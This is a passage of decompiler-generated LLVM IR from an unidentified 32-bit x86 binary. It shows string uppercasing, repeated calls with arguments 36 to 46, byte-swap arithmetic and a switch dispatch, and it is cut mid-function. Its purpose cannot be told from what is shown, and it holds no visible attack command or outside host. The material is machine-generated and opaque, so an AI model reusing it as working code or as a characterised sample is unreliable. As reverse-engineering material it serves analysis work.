  store i1 %v12_80482b4212, i1* %zf.global-to-local, align 1
  %v7_80482b6213 = icmp sgt i32 %v2_80482a5211, 0
  br i1 %v7_80482b6213, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482b8:                             ; preds = %dec_label_pc_804829d.preheader, %dec_label_pc_80482cc
  %v4_80482a0216 = phi i32 [ %v4_80482a0, %dec_label_pc_80482cc ], [ %v6_80481cf, %dec_label_pc_804829d.preheader ]
  %v4_80482be215 = phi i32 [ %v1_80482d3, %dec_label_pc_80482cc ], [ 0, %dec_label_pc_804829d.preheader ]
  %v3_80482b8214 = phi i8* [ %v3_80482a0.pre, %dec_label_pc_80482cc ], [ %tmp237, %dec_label_pc_804829d.preheader ]
  %v2_80482bc = add i32 %v4_80482be215, %v4_80482a0216
  %v12_80482bc = icmp eq i32 %v2_80482bc, 0
  store i1 %v12_80482bc, i1* %zf.global-to-local, align 1
  store i32 %v2_80482bc, i32* %ecx.global-to-local, align 4
  %v1_80482be = inttoptr i32 %v2_80482bc to i8*
  %v2_80482be = load i8, i8* %v1_80482be, align 1
  %v3_80482be = zext i8 %v2_80482be to i32
  %v5_80482be = and i32 %v4_80482be215, -256
  %v6_80482be = or i32 %v3_80482be, %v5_80482be
  store i32 %v6_80482be, i32* %edx.global-to-local, align 4
  %v1_80482c0 = add i32 %v6_80482be, -97
  store i32 %v1_80482c0, i32* %eax.global-to-local, align 4
  %v1_80482c3 = trunc i32 %v1_80482c0 to i8
  %v11_80482c3 = icmp eq i8 %v1_80482c3, 25
  store i1 %v11_80482c3, i1* %zf.global-to-local, align 1
  %v8_80482c5 = icmp ugt i8 %v1_80482c3, 25
  br i1 %v8_80482c5, label %dec_label_pc_80482cc, label %dec_label_pc_80482c7

dec_label_pc_80482c7:                             ; preds = %dec_label_pc_80482b8
  %v1_80482c7 = add i32 %v6_80482be, -32
  store i32 %v1_80482c7, i32* %eax.global-to-local, align 4
  %v1_80482ca = trunc i32 %v1_80482c7 to i8
  store i8 %v1_80482ca, i8* %v1_80482be, align 1
  %v0_804829d.pre.pre = load i32, i32* @esp, align 4
  %v3_80482a0.pre.pre = load i8*, i8** %stack_var_-20900, align 4
  br label %dec_label_pc_80482cc

dec_label_pc_80482cc:                             ; preds = %dec_label_pc_80482b8, %dec_label_pc_80482c7
  %v3_80482a0.pre = phi i8* [ %v3_80482b8214, %dec_label_pc_80482b8 ], [ %v3_80482a0.pre.pre, %dec_label_pc_80482c7 ]
  %v0_804829d.pre = phi i32 [ %v15_8048194, %dec_label_pc_80482b8 ], [ %v0_804829d.pre.pre, %dec_label_pc_80482c7 ]
  %v1_80482d3 = add i32 %v4_80482be215, 1
  %v9_804829d = icmp eq i32 %v0_804829d.pre, 12
  store i1 %v9_804829d, i1* %zf.global-to-local, align 1
  %v4_80482a0 = ptrtoint i8* %v3_80482a0.pre to i32
  store i32 %v4_80482a0, i32* %eax.global-to-local, align 4
  store i32 %v4_80482a0, i32* %stack_var_-20972, align 4
  %v2_80482a5 = call i32 @function_8051bf0(i8* %v3_80482a0.pre)
  store i32 %v2_80482a5, i32* %eax.global-to-local, align 4
  store i32 %v1_80482d3, i32* %edx.global-to-local, align 4
  %v12_80482b4 = icmp eq i32 %v2_80482a5, %v1_80482d3
  store i1 %v12_80482b4, i1* %zf.global-to-local, align 1
  %v7_80482b6 = icmp sgt i32 %v2_80482a5, %v1_80482d3
  br i1 %v7_80482b6, label %dec_label_pc_80482b8, label %dec_label_pc_80482dd

dec_label_pc_80482dd:                             ; preds = %dec_label_pc_80482cc, %dec_label_pc_804829d.preheader
  %v0_80482dd = load i32, i32* @edi, align 4
  %v7_80482e7 = icmp sgt i32 %v0_80482dd, 256
  %.v0_80482dd = select i1 %v7_80482e7, i32 256, i32 %v0_80482dd
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 36, i32* %stack_var_-20972, align 4
  %v2_80482f6 = call i32 @function_80512a0(i8 36)
  store i32 %v2_80482f6, i32* %eax.global-to-local, align 4
  store i32 37, i32* %stack_var_-20972, align 4
  %v2_8048302 = call i32 @function_80512a0(i8 37)
  store i32 %v2_8048302, i32* %eax.global-to-local, align 4
  store i32 38, i32* %stack_var_-20972, align 4
  %v2_804830e = call i32 @function_80512a0(i8 38)
  store i32 %v2_804830e, i32* %eax.global-to-local, align 4
  store i32 39, i32* %stack_var_-20972, align 4
  %v2_804831a = call i32 @function_80512a0(i8 39)
  store i32 %v2_804831a, i32* %eax.global-to-local, align 4
  store i32 40, i32* %stack_var_-20972, align 4
  %v2_8048326 = call i32 @function_80512a0(i8 40)
  store i32 %v2_8048326, i32* %eax.global-to-local, align 4
  store i32 41, i32* %stack_var_-20972, align 4
  %v2_8048332 = call i32 @function_80512a0(i8 41)
  store i32 %v2_8048332, i32* %eax.global-to-local, align 4
  store i32 42, i32* %stack_var_-20972, align 4
  %v2_804833e = call i32 @function_80512a0(i8 42)
  store i32 %v2_804833e, i32* %eax.global-to-local, align 4
  store i32 43, i32* %stack_var_-20972, align 4
  %v2_804834a = call i32 @function_80512a0(i8 43)
  store i32 %v2_804834a, i32* %eax.global-to-local, align 4
  store i32 44, i32* %stack_var_-20972, align 4
  %v2_8048356 = call i32 @function_80512a0(i8 44)
  store i32 %v2_8048356, i32* %eax.global-to-local, align 4
  store i32 45, i32* %stack_var_-20972, align 4
  %v2_8048362 = call i32 @function_80512a0(i8 45)
  store i32 %v2_8048362, i32* %eax.global-to-local, align 4
  store i32 46, i32* %stack_var_-20972, align 4
  %v2_804836e = call i32 @function_80512a0(i8 46)
  %v2_8048373 = load i32, i32* %stack_var_-20972, align 4
  store i32 %v2_8048373, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %.v0_80482dd, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* %stack_var_-20972, align 4
  %v2_804837f = sext i32 %.v0_80482dd to i64
  %v3_804837f = call i32 @function_8053298(i64 %v2_804837f, i32 3140)
  store i32 %v3_804837f, i32* %eax.global-to-local, align 4
  store i32 %v3_804837f, i32* @esi, align 4
  store i32 %.v0_80482dd, i32* @ebx, align 4
  %v1_8048391 = icmp eq i32 %.v0_80482dd, 0
  store i1 %v1_8048391, i1* %zf.global-to-local, align 1
  %tmp136 = icmp slt i32 %.v0_80482dd, 1
  br i1 %tmp136, label %dec_label_pc_80484be, label %dec_label_pc_8048399

dec_label_pc_8048399:                             ; preds = %dec_label_pc_80482dd
  %v0_8048399 = load i32, i32* @ebp, align 4
  %v1_8048399 = trunc i32 %v0_8048399 to i8
  store i32 0, i32* @ebp, align 4
  %v1_804839d5 = urem i32 %v0_8048399, 256
  %v3_804839d = icmp eq i8 %v1_8048399, 0
  store i1 %v3_804839d, i1* %zf.global-to-local, align 1
  store i32 %v1_804839d5, i32* @ecx, align 4
  %v2_80483e1 = inttoptr i32 %v1_804839d5 to i8*
  %v2_8049f7d = inttoptr i32 %tmp to i8*
  %v1_8049f3f = trunc i32 %tmp to i8
  %v2_804a072 = inttoptr i32 %v0_804816e to i32*
  br label %dec_label_pc_80483a7

dec_label_pc_80483a7:                             ; preds = %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge, %dec_label_pc_8048399
  %v0_80483a9 = phi i32 [ %v0_80483a9.pre, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ %v3_804837f, %dec_label_pc_8048399 ]
  %v0_80483a7 = phi i32 [ %v4_8049f85, %dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge ], [ 0, %dec_label_pc_8048399 ]
  store i32 %v0_80483a7, i32* %edx.global-to-local, align 4
  %v1_80483a9 = add i32 %v0_80483a9, 4
  %v2_80483a9 = inttoptr i32 %v1_80483a9 to i8*
  store i8 0, i8* %v2_80483a9, align 1
  %v0_80483ad = load i32, i32* %edx.global-to-local, align 4
  %v2_80483ad = ashr i32 %v0_80483ad, 31
  %v3_80483ad = icmp eq i32 %v2_80483ad, 0
  store i1 %v3_80483ad, i1* %zf.global-to-local, align 1
  store i32 %v2_80483ad, i32* %edx.global-to-local, align 4
  %v0_80483b0 = load i32, i32* @ebp, align 4
  store i32 %v0_80483b0, i32* %eax.global-to-local, align 4
  %v0_80483b2 = load i32, i32* @esp, align 4
  %v1_80483b2 = add i32 %v0_80483b2, 88
  %v2_80483b2 = inttoptr i32 %v1_80483b2 to i32*
  %v3_80483b2 = load i32, i32* %v2_80483b2, align 4
  %v5_80483b2 = zext i32 %v0_80483b0 to i64
  %v7_80483b2 = zext i32 %v2_80483ad to i64
  %v8_80483b2 = mul nuw i64 %v7_80483b2, 4294967296
  %v9_80483b2 = or i64 %v5_80483b2, %v8_80483b2
  %v10_80483b2 = zext i32 %v3_80483b2 to i64
  %v11_80483b2 = sdiv i64 %v9_80483b2, %v10_80483b2
  %v12_80483b2 = trunc i64 %v11_80483b2 to i32
  store i32 %v12_80483b2, i32* %eax.global-to-local, align 4
  %v13_80483b2 = srem i64 %v9_80483b2, %v10_80483b2
  %v14_80483b2 = trunc i64 %v13_80483b2 to i32
  store i32 %v14_80483b2, i32* %edx.global-to-local, align 4
  %v1_80483b6 = add i32 %v0_80483b2, 20932
  %v2_80483b6 = inttoptr i32 %v1_80483b6 to i32*
  %v3_80483b6 = load i32, i32* %v2_80483b6, align 4
  store i32 %v3_80483b6, i32* %eax.global-to-local, align 4
  %v0_80483bd = load i32, i32* @esi, align 4
  %v1_80483bd = inttoptr i32 %v0_80483bd to i32*
  store i32 -1, i32* %v1_80483bd, align 4
  %v0_80483c3 = load i32, i32* %edx.global-to-local, align 4
  %v0_80483c6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80483c6 = mul i32 %v0_80483c3, 24
  %v3_80483c6 = add i32 %v0_80483c6, %v2_80483c6
  store i32 %v3_80483c6, i32* @edi, align 4
  %v0_80483c9 = load i32, i32* @esi, align 4
  %v1_80483c9 = add i32 %v0_80483c9, 532
  store i32 %v1_80483c9, i32* %edx.global-to-local, align 4
  %v1_80483cf = load i32, i32* @esp, align 4
  %v2_80483cf = add i32 %v1_80483cf, 36
  %v3_80483cf = inttoptr i32 %v2_80483cf to i32*
  store i32 %v1_80483c9, i32* %v3_80483cf, align 4
  %v0_80483d3 = load i32, i32* @edi, align 4
  %v1_80483d3 = add i32 %v0_80483d3, 16
  %v2_80483d3 = inttoptr i32 %v1_80483d3 to i32*
  %v3_80483d3 = load i32, i32* %v2_80483d3, align 4
  store i32 %v3_80483d3, i32* %eax.global-to-local, align 4
  %v1_80483d6 = load i32, i32* @esi, align 4
  %v2_80483d6 = add i32 %v1_80483d6, 16
  %v3_80483d6 = inttoptr i32 %v2_80483d6 to i32*
  store i32 %v3_80483d3, i32* %v3_80483d6, align 4
  %v0_80483d9 = load i32, i32* @ecx, align 4
  %v1_80483d9 = load i32, i32* @esp, align 4
  %v2_80483d9 = add i32 %v1_80483d9, -4
  %v3_80483d9 = inttoptr i32 %v2_80483d9 to i32*
  store i32 %v0_80483d9, i32* %v3_80483d9, align 4
  %v0_80483da = load i32, i32* @ecx, align 4
  %v2_80483da = add i32 %v1_80483d9, -8
  %v3_80483da = inttoptr i32 %v2_80483da to i32*
  store i32 %v0_80483da, i32* %v3_80483da, align 4
  %v1_80483db = add i32 %v1_80483d9, 64
  %v2_80483db = inttoptr i32 %v1_80483db to i32*
  %v3_80483db = load i32, i32* %v2_80483db, align 4
  store i32 %v3_80483db, i32* %eax.global-to-local, align 4
  %v2_80483df = add i32 %v1_80483d9, -12
  %v3_80483df = inttoptr i32 %v2_80483df to i32*
  store i32 %v3_80483db, i32* %v3_80483df, align 4
  %v0_80483e0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80483e0 = add i32 %v1_80483d9, -16
  %v3_80483e0 = inttoptr i32 %v2_80483e0 to i32*
  store i32 %v0_80483e0, i32* %v3_80483e0, align 4
  %v3_80483e1 = call i32 @function_8051c10(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80483e1, i32* %eax.global-to-local, align 4
  %v0_80483e6 = load i32, i32* @esp, align 4
  %v1_80483e6 = add i32 %v0_80483e6, 16
  %v6_80483e6 = icmp eq i32 %v1_80483e6, 0
  store i1 %v6_80483e6, i1* %zf.global-to-local, align 1
  %v0_80483e9 = load i32, i32* @esi, align 4
  %v1_80483e9 = add i32 %v0_80483e9, 532
  %v2_80483e9 = inttoptr i32 %v1_80483e9 to i8*
  %v3_80483e9 = load i8, i8* %v2_80483e9, align 1
  %v12_80483e9 = icmp eq i8 %v3_80483e9, 47
  store i1 %v12_80483e9, i1* %zf.global-to-local, align 1
  br i1 %v12_80483e9, label %dec_label_pc_804841e, label %dec_label_pc_80483f2

dec_label_pc_80483f2:                             ; preds = %dec_label_pc_80483a7
  %v9_80483f2 = icmp eq i32 %v0_80483e6, -4
  store i1 %v9_80483f2, i1* %zf.global-to-local, align 1
  %v1_80483f5 = add i32 %v0_80483e6, 52
  %v2_80483f5 = inttoptr i32 %v1_80483f5 to i32*
  %v3_80483f5 = load i32, i32* %v2_80483f5, align 4
  store i32 %v3_80483f5, i32* %eax.global-to-local, align 4
  %v3_80483f9 = inttoptr i32 %v0_80483e6 to i32*
  store i32 %v3_80483f5, i32* %v3_80483f9, align 4
  %v2_80483fa = call i32 @function_8051bf0(i8* %v2_80483e1)
  store i32 %v2_80483fa, i32* %eax.global-to-local, align 4
  %v0_80483ff = load i32, i32* @esp, align 4
  %v9_80483ff = icmp eq i32 %v0_80483ff, -12
  store i1 %v9_80483ff, i1* %zf.global-to-local, align 1
  %v2_8048402 = add i32 %v0_80483ff, 8
  %v3_8048402 = inttoptr i32 %v2_8048402 to i32*
  store i32 %v2_80483fa, i32* %v3_8048402, align 4
  %v1_8048403 = add i32 %v0_80483ff, 52
  %v2_8048403 = inttoptr i32 %v1_8048403 to i32*
  %v3_8048403 = load i32, i32* %v2_8048403, align 4
  %v2_8048407 = add i32 %v0_80483ff, 4
  %v3_8048407 = inttoptr i32 %v2_8048407 to i32*
  store i32 %v3_8048403, i32* %v3_8048407, align 4
  %v0_8048408 = load i32, i32* @esi, align 4
  %v1_8048408 = add i32 %v0_8048408, 533
  store i32 %v1_8048408, i32* %eax.global-to-local, align 4
  %v3_804840e = inttoptr i32 %v0_80483ff to i32*
  store i32 %v1_8048408, i32* %v3_804840e, align 4
  %v4_804840f = call i32 @function_80526f3(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804840f, i32* %eax.global-to-local, align 4
  %v0_8048414 = load i32, i32* @esi, align 4
  %v1_8048414 = add i32 %v0_8048414, 532
  %v2_8048414 = inttoptr i32 %v1_8048414 to i8*
  store i8 47, i8* %v2_8048414, align 1
  %v0_804841b = load i32, i32* @esp, align 4
  %v1_804841b = add i32 %v0_804841b, 16
  %v6_804841b = icmp eq i32 %v1_804841b, 0
  store i1 %v6_804841b, i1* %zf.global-to-local, align 1
  %v0_804841e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804841e

dec_label_pc_804841e:                             ; preds = %dec_label_pc_80483a7, %dec_label_pc_80483f2
  %v1_804841e = phi i32 [ %v1_80483e6, %dec_label_pc_80483a7 ], [ %v1_804841b, %dec_label_pc_80483f2 ]
  %v0_804841e = phi i32 [ %v3_80483e1, %dec_label_pc_80483a7 ], [ %v0_804841e.pre, %dec_label_pc_80483f2 ]
  %v2_804841e = add i32 %v1_804841e, -4
  %v3_804841e = inttoptr i32 %v2_804841e to i32*
  store i32 %v0_804841e, i32* %v3_804841e, align 4
  %v0_804841f = load i32, i32* %eax.global-to-local, align 4
  %v2_804841f = add i32 %v1_804841e, -8
  %v3_804841f = inttoptr i32 %v2_804841f to i32*
  store i32 %v0_804841f, i32* %v3_804841f, align 4
  %v1_8048420 = add i32 %v1_804841e, 56
  %v2_8048420 = inttoptr i32 %v1_8048420 to i32*
  %v3_8048420 = load i32, i32* %v2_8048420, align 4
  %v2_8048424 = add i32 %v1_804841e, -12
  %v3_8048424 = inttoptr i32 %v2_8048424 to i32*
  store i32 %v3_8048420, i32* %v3_8048424, align 4
  %v0_8048425 = load i32, i32* @esi, align 4
  %v1_8048425 = add i32 %v0_8048425, 1440
  store i32 %v1_8048425, i32* %eax.global-to-local, align 4
  %v2_804842b = add i32 %v1_804841e, -16
  %v3_804842b = inttoptr i32 %v2_804842b to i32*
  store i32 %v1_8048425, i32* %v3_804842b, align 4
  %v3_804842c = call i32 @function_8051c10(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804842c, i32* %eax.global-to-local, align 4
  %v0_8048431 = load i32, i32* @esp, align 4
  %v1_8048431 = inttoptr i32 %v0_8048431 to i32*
  %v2_8048431 = load i32, i32* %v1_8048431, align 4
  store i32 %v2_8048431, i32* @ebx, align 4
  %v0_8048433 = load i32, i32* @esi, align 4
  %v1_8048433 = add i32 %v0_8048433, 1431
  store i32 %v1_8048433, i32* %eax.global-to-local, align 4
  %v1_8048439 = add i32 %v0_8048431, 72
  %v2_8048439 = inttoptr i32 %v1_8048439 to i32*
  %v3_8048439 = load i32, i32* %v2_8048439, align 4
  store i32 %v3_8048439, i32* %ecx.global-to-local, align 4
  %v2_804843d = add i32 %v0_8048431, 4
  %v3_804843d = inttoptr i32 %v2_804843d to i32*
  store i32 %v3_8048439, i32* %v3_804843d, align 4
  %v0_804843e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804843e, i32* %v1_8048431, align 4
  %v3_804843f = call i32 @function_8051c10(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804843f, i32* %eax.global-to-local, align 4
  %v0_8048444 = load i32, i32* @esp, align 4
  %v1_8048444 = inttoptr i32 %v0_8048444 to i32*
  %v2_8048444 = load i32, i32* %v1_8048444, align 4
  store i32 %v2_8048444, i32* %eax.global-to-local, align 4
  %v3_8048444 = add i32 %v0_8048444, 4
  %v1_8048445 = inttoptr i32 %v3_8048444 to i32*
  %v2_8048445 = load i32, i32* %v1_8048445, align 4
  store i32 %v2_8048445, i32* %edx.global-to-local, align 4
  %v1_8048446 = add i32 %v0_8048444, 76
  %v2_8048446 = inttoptr i32 %v1_8048446 to i32*
  %v3_8048446 = load i32, i32* %v2_8048446, align 4
  store i32 %v3_8048446, i32* %v1_8048445, align 4
  %v0_804844b = load i32, i32* @esi, align 4
  %v1_804844b = add i32 %v0_804844b, 789
  store i32 %v1_804844b, i32* %eax.global-to-local, align 4
  store i32 %v1_804844b, i32* %v1_8048444, align 4
  %v3_8048452 = call i32 @function_8051c10(i8* %v2_80483e1, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048452, i32* %eax.global-to-local, align 4
  %v0_8048457 = load i32, i32* @esp, align 4
  %v6_8048457 = icmp eq i32 %v0_8048457, -16
  store i1 %v6_8048457, i1* %zf.global-to-local, align 1
  %v0_804845a = load i32, i32* @edi, align 4
  %v1_804845a = add i32 %v0_804845a, 20
  %v2_804845a = inttoptr i32 %v1_804845a to i8*
  %v3_804845a = load i8, i8* %v2_804845a, align 1
  %v12_804845a = icmp eq i8 %v3_804845a, 31
  store i1 %v12_804845a, i1* %zf.global-to-local, align 1
  %tmp238 = icmp ult i8 %v3_804845a, 32
  br i1 %tmp238, label %dec_label_pc_8048460, label %dec_label_pc_804848a

dec_label_pc_8048460:                             ; preds = %dec_label_pc_804841e
  %v1_8048460 = add i32 %v0_804845a, 16
  %v2_8048460 = inttoptr i32 %v1_8048460 to i32*
  %v3_8048460 = load i32, i32* %v2_8048460, align 4
  store i32 %v3_8048460, i32* %ebx.global-to-local, align 4
  %v1_8048463 = call i32 @function_804f020(i32 %v1_804839d5)
  store i32 %v1_8048463, i32* %eax.global-to-local, align 4
  %v1_8048468 = trunc i32 %v3_8048460 to i16
  %v2_8048468 = call i16 @llvm.bswap.i16(i16 %v1_8048468)
  %v3_8048468 = zext i16 %v2_8048468 to i32
  %v1_804846c = udiv i32 %v3_8048460, 65536
  %v2_804846c = mul nuw i32 %v3_8048468, 65536
  %v1_804846f = trunc i32 %v1_804846c to i16
  %v2_804846f = call i16 @llvm.bswap.i16(i16 %v1_804846f)
  %v3_804846f = zext i16 %v2_804846f to i32
  %v6_804846f = or i32 %v3_804846f, %v2_804846c
  store i32 %v6_804846f, i32* %ebx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8048475 = load i32, i32* @edi, align 4
  %v1_8048475 = add i32 %v0_8048475, 20
  %v2_8048475 = inttoptr i32 %v1_8048475 to i8*
  %v3_8048475 = load i8, i8* %v2_8048475, align 1
  %v4_8048475 = zext i8 %v3_8048475 to i32
  store i32 %v4_8048475, i32* %ecx.global-to-local, align 4
  %tmp242 = urem i8 %v3_8048475, 32
  %v4_8048478 = icmp eq i8 %tmp242, 0
  br i1 %v4_8048478, label %bb137, label %bb

bb:                                               ; preds = %dec_label_pc_8048460
  %v2_8048478 = zext i8 %tmp242 to i32
  %v5_8048478 = lshr i32 %v1_8048463, %v2_8048478
  %v6_8048478 = icmp eq i32 %v5_8048478, 0
  store i1 %v6_8048478, i1* %zf.global-to-local, align 1
  store i32 %v5_8048478, i32* %eax.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_8048460, %bb
  %v0_804847a = phi i32 [ %v1_8048463, %dec_label_pc_8048460 ], [ %v5_8048478, %bb ]
  %v2_804847a = add i32 %v0_804847a, %v6_804846f
  %v12_804847a = icmp eq i32 %v2_804847a, 0
  store i1 %v12_804847a, i1* %zf.global-to-local, align 1
  %v1_804847c = trunc i32 %v2_804847a to i16
  %v2_804847c = call i16 @llvm.bswap.i16(i16 %v1_804847c)
  %v3_804847c = zext i16 %v2_804847c to i32
  %v1_8048480 = udiv i32 %v2_804847a, 65536
  %v2_8048480 = mul nuw i32 %v3_804847c, 65536
  %v1_8048483 = trunc i32 %v1_8048480 to i16
  %v2_8048483 = call i16 @llvm.bswap.i16(i16 %v1_8048483)
  %v3_8048483 = zext i16 %v2_8048483 to i32
  %v6_8048483 = or i32 %v3_8048483, %v2_8048480
  store i32 %v6_8048483, i32* %eax.global-to-local, align 4
  %v1_8048487 = load i32, i32* @esi, align 4
  %v2_8048487 = add i32 %v1_8048487, 16
  %v3_8048487 = inttoptr i32 %v2_8048487 to i32*
  store i32 %v6_8048483, i32* %v3_8048487, align 4
  br label %dec_label_pc_804848a

dec_label_pc_804848a:                             ; preds = %dec_label_pc_804841e, %bb137
  %v1_804848a = call i32 @function_804f020(i32 %v1_804839d5)
  %v2_804848a = sext i32 %v1_804848a to i64
  store i32 -858993459, i32* @ecx, align 4
  store i32 %v1_804848a, i32* @ebx, align 4
  %v5_8048496 = mul nuw nsw i64 %v2_804848a, 3435973837
  %v6_8048496 = trunc i64 %v5_8048496 to i32
  %v7_8048496 = udiv i64 %v5_8048496, 4294967296
  %v8_8048496 = trunc i64 %v7_8048496 to i32
  store i32 %v6_8048496, i32* %eax.global-to-local, align 4
  store i32 %v8_8048496, i32* %edx.global-to-local, align 4
  %v1_8048498 = load i32, i32* @esp, align 4
  %v2_8048498 = add i32 %v1_8048498, 12
  %v3_8048498 = inttoptr i32 %v2_8048498 to i32*
  store i32 %v8_8048496, i32* %v3_8048498, align 4
  %v0_804849c = load i32, i32* %eax.global-to-local, align 4
  %v1_804849c = load i32, i32* @esp, align 4
  %v2_804849c = add i32 %v1_804849c, 8
  %v3_804849c = inttoptr i32 %v2_804849c to i32*
  store i32 %v0_804849c, i32* %v3_804849c, align 4
  %v0_80484a0 = load i32, i32* @esp, align 4
  %v1_80484a0 = add i32 %v0_80484a0, 12
  %v2_80484a0 = inttoptr i32 %v1_80484a0 to i32*
  %v3_80484a0 = load i32, i32* %v2_80484a0, align 4
  %v0_80484a4 = load i32, i32* @ebx, align 4
  %v2_80484a6 = udiv i32 %v3_80484a0, 4
  %v3_80484a9 = mul i32 %v2_80484a6, 5
  store i32 %v3_80484a9, i32* %edx.global-to-local, align 4
  %v2_80484ac = sub i32 %v0_80484a4, %v3_80484a9
  store i32 %v2_80484ac, i32* %eax.global-to-local, align 4
  %v9_80484ae = icmp eq i32 %v2_80484ac, 4
  store i1 %v9_80484ae, i1* %zf.global-to-local, align 1
  switch i32 %v2_80484ac, label %dec_label_pc_8049f6a [
    i32 0, label %dec_label_pc_8049f3a
    i32 1, label %dec_label_pc_8049fc3
    i32 2, label %dec_label_pc_8049ff8
    i32 3, label %dec_label_pc_804a062
  ]

dec_label_pc_80484be:                             ; preds = %dec_label_pc_80482dd
  %v1_80484be = add i32 %v3_804837f, 16
  store i32 %v1_80484be, i32* %edx.global-to-local, align 4
  %v2_80484c1 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_80484c1, i32* %ecx.global-to-local, align 4
  %v2_80484c8 = ptrtoint i32* %stack_var_-344 to i32
  store i32 %v2_80484c8, i32* %eax.global-to-local, align 4
  %v1_80484cf = add i32 %v3_804837f, 1452
  %v9_80484cf = icmp eq i32 %v1_80484cf, 0
  store i1 %v9_80484cf, i1* %zf.global-to-local, align 1
  store i32 %v1_80484cf, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80484e5.preheader

dec_label_pc_80484e5.preheader:                   ; preds = %dec_label_pc_80484be, %dec_label_pc_8049f8f
  %v0_80484e5.pre = phi i32 [ %v0_80484e5.pre.pre, %dec_label_pc_8049f8f ], [ %v15_8048194, %dec_label_pc_80484be ]
  %stack_var_-20924.0.ph = phi i32 [ %tmp, %dec_label_pc_8049f8f ], [ %v1_80484cf, %dec_label_pc_80484be ]
  %v1_80484ea = inttoptr i32 %stack_var_-20924.0.ph to i32*
  %v1_8048752 = inttoptr i32 %stack_var_-20924.0.ph to i8*
  %v1_804887b = trunc i32 %stack_var_-20924.0.ph to i8
  %v3_8048aab = sext i32 %stack_var_-20924.0.ph to i64
  br label %dec_label_pc_80484e5

dec_label_pc_80484e5:                             ; preds = %dec_label_pc_8048ce9, %dec_label_pc_8048cdd, %dec_label_pc_80484e5, %dec_label_pc_8048d91, %dec_label_pc_80484e5.preheader
  %v0_80484e5 = phi i32 [ %v0_80484e5.pre, %dec_label_pc_80484e5.preheader ], [ %v1_804850c, %dec_label_pc_80484e5 ], [ %v0_8048597, %dec_label_pc_8048cdd ], [ %v1_8048d39, %dec_label_pc_8048ce9 ], [ %v0_8048da7, %dec_label_pc_8048d91 ]
  %v9_80484e5 = icmp eq i32 %v0_80484e5, 12
  store i1 %v9_80484e5, i1* %zf.global-to-local, align 1
  %v1_80484e8 = add i32 %v0_80484e5, -16
  %v2_80484e8 = inttoptr i32 %v1_80484e8 to i32*
  store i32 0, i32* %v2_80484e8, align 4
  %v2_80484ea = call i32 @function_8052452(i32* %v1_80484ea)
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80484f4 = load i32, i32* @esp, align 4
  %v2_80484f4 = add i32 %v1_80484f4, 96
  %v3_80484f4 = inttoptr i32 %v2_80484f4 to i32*
  store i32 %v2_80484ea, i32* %v3_80484f4, align 4
  %v0_80484f8 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80484f8, i32* %ecx.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80484fc = load i32, i32* @esp, align 4
  %v1_80484fc = add i32 %v0_80484fc, 40
  %v2_80484fc = inttoptr i32 %v1_80484fc to i32*
  %v3_80484fc = load i32, i32* %v2_80484fc, align 4
  %v4_80484fc = inttoptr i32 %v3_80484fc to i8*
  store i32 %v3_80484fc, i32* %edi.global-to-local, align 4
  %v5_8048501 = call i8* @_memset(i8* %v4_80484fc, i32 0, i32 %v0_80484f8)
  %v0_8048503 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8048503, i32* %ecx.global-to-local, align 4
  %v0_8048505 = load i32, i32* @esp, align 4
  %v1_8048505 = add i32 %v0_8048505, 36
  %v2_8048505 = inttoptr i32 %v1_8048505 to i32*
  %v3_8048505 = load i32, i32* %v2_8048505, align 4
  %v4_8048505 = inttoptr i32 %v3_8048505 to i8*
  store i32 %v3_8048505, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v2_804850a = load i32, i32* %eax.global-to-local, align 4
  %v5_804850a = call i8* @_memset(i8* %v4_8048505, i32 %v2_804850a, i32 %v0_8048503)
  %v6_804850a = ptrtoint i8* %v5_804850a to i32
  store i32 %v6_804850a, i32* @ecx, align 4
  %v0_804850c = load i32, i32* @esp, align 4
  %v1_804850c = add i32 %v0_804850c, 16
  %v1_804850f = add i32 %v0_804850c, 128
  %v2_804850f = inttoptr i32 %v1_804850f to i32*
  %v3_804850f = load i32, i32* %v2_804850f, align 4
  store i32 %v3_804850f, i32* %esi.global-to-local, align 4
  %v1_8048513 = icmp eq i32 %v3_804850f, 0
  store i1 %v1_8048513, i1* %zf.global-to-local, align 1
  %tmp138 = icmp slt i32 %v3_804850f, 1
  br i1 %tmp138, label %dec_label_pc_80484e5, label %dec_label_pc_8048517

dec_label_pc_8048517:                             ; preds = %dec_label_pc_80484e5
  %v1_8048517 = add i32 %v0_804850c, 64
  %v2_8048517 = inttoptr i32 %v1_8048517 to i32*
  %v3_8048517 = load i32, i32* %v2_8048517, align 4
  store i32 %v3_8048517, i32* %esi.global-to-local, align 4
  %v1_804851b = add i32 %v0_804850c, 44
  %v2_804851b = inttoptr i32 %v1_804851b to i32*
  %v3_804851b = load i32, i32* %v2_804851b, align 4
  store i32 %v3_804851b, i32* @ebp, align 4
  %v1_804851f = add i32 %v3_8048517, 1440
  %v6_804851f = icmp eq i32 %v1_804851f, 0
